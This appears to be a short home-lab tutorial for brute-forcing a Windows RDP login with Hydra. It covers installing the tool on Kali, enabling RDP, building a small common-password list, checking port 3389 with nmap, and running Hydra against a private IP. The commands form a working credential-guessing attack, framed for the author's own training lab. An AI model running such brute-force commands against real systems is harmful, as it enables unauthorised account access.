

Step 1: Install Hydra

On Kali:    sudo apt update
            sudo apt install hydra -y

Verify:     hydra -h


Step 2: Enable RDP

On Windows: Settings → System → Remote Desktop

Enable: Allow Remote Desktop
        Also enable the firewall rule.

Step 4: Find Username
whoami

Example:    DESKTOP-5T5E396\Ayush

Username:   Ayush


Step 5: Create Password List

nano passwords.txt

Example:

123456
password
Password123
admin
welcome
qwerty
test123
SOCLAB
SOCLab@123

Step 6: Check RDP Port

nmap -Pn -p3389 192.168.234.128


Expected:   3389/tcp open ms-wbt-server


Step 7: Hydra Command (Lab Only)
hydra -l Ayush -P passwords.txt rdp://192.168.234.128

If you want Hydra to stop after the first successful password:

hydra -f -l Ayush -P passwords.txt rdp://192.168.234.128